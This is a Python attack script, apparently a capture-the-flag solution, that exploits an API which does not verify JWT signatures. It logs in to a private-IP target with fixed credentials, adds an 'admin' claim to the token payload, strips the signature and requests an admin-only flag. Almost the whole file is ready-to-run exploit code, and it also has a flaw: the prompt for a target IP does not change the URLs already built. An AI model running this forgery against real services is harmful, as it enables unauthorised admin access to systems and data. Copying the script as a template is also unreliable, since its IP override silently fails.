import requests
import json
import base64
import sys

# --- Configuration for Example 2: No Signature Verification ---
TARGET_IP = "10.64.168.127"
AUTH_URL = f"http://{TARGET_IP}/api/v1.0/example2"
FLAG_URL = f"http://{TARGET_IP}/api/v1.0/example2?username=admin"
USERNAME = "user"
PASSWORD = "password2" 
# -------------------------------------------------------------------

def decode_base64_url(data):
    """
    Decodes a Base64URL string, automatically handling missing padding 
    (= characters) which are stripped from JWT segments.
    """
    # Calculate required padding
    padding = '=' * (4 - (len(data) % 4))
    # Decode Base64URL
    return base64.urlsafe_b64decode(data + padding).decode('utf-8')

def base64url_encode(data):
    """Encodes bytes to Base64URL string (removes padding, replaces chars)"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def exploit_example2_no_signature():
    print(f"[*] Exploit 2: Starting No Signature Verification Attack (IP: {TARGET_IP})")
    
    # Step 1: Authenticate to retrieve a base JWT token
    print(f"\n[1/4] Authenticating to {AUTH_URL}...")
    auth_data = json.dumps({"username": USERNAME, "password": PASSWORD})

    try:
        response = requests.post(
            AUTH_URL,
            data=auth_data,
            headers={'Content-Type': 'application/json'}
        )
        response.raise_for_status()
        data = response.json()
        
        if 'token' not in data:
            print("[-] Error: 'token' not found in response.")
            print(f"Response: {data}")
            return

        jwt_token = data['token']
        print(f"[+] Base Token Retrieved: {jwt_token}")

    except requests.exceptions.RequestException as e:
        print(f"[-] HTTP Request Failed during authentication: {e}")
        return
    except json.JSONDecodeError:
        print(f"[-] Error: Failed to decode JSON response. Received: {response.text}")
        return

    # Step 2: Extract parts and modify the payload
    try:
        # JWT structure: Header.Payload.Signature
        parts = jwt_token.split('.')
        if len(parts) != 3:
            print("[-] Error: Base JWT format invalid (expected 3 segments).")
            return

        header_b64 = parts[0]
        payload_b64 = parts[1]
        
        # Decode, modify, and re-encode the payload
        decoded_payload_str = decode_base64_url(payload_b64)
        payload = json.loads(decoded_payload_str)
        
        print(f"[i] Original Payload: {payload}")
        
        # Modification: Privilege escalation by setting admin claim
        payload['admin'] = 1
        
        new_payload_b64 = base64url_encode(json.dumps(payload).encode('utf-8'))
        
        print(f"[i] Modified Payload: {payload}")
        
    except Exception as e:
        print(f"[-] Error during token processing: {e}")
        return

    # Step 3: Forge the token by combining header, modified payload, and NO signature
    # The vulnerability allows skipping signature validation, so we remove the third segment.
    forged_token = f"{header_b64}.{new_payload_b64}."
    print(f"\n[3/4] Forged Token (Signature Stripped): {forged_token}")
    print("[i] The token is valid because the server is not checking the signature.")

    # Step 4: Use the forged token to get the flag
    print(f"\n[4/4] Sending final request with forged token to {FLAG_URL}")
    flag_response = requests.get(
        FLAG_URL,
        headers={'Authorization': f'Bearer {forged_token}'}
    )

    print("-" * 50)
    print(f"Example 2 Result (No Signature Verification):")
    print(f"Request URL: {FLAG_URL}")
    print(f"Response Status: {flag_response.status_code}")
    print("Response Body (Flag likely here):")
    print(flag_response.text.strip())
    print("-" * 50)


if __name__ == "__main__":
    
    print("--- JWT No Signature Verification Exploiter (Example 2) ---")
    
    # Allow user to specify IP, default to 10.64.168.127
    ip_input = input(f"Enter the target IP address (default: {TARGET_IP}): ").strip()
    if ip_input:
        TARGET_IP = ip_input
        
    exploit_example2_no_signature()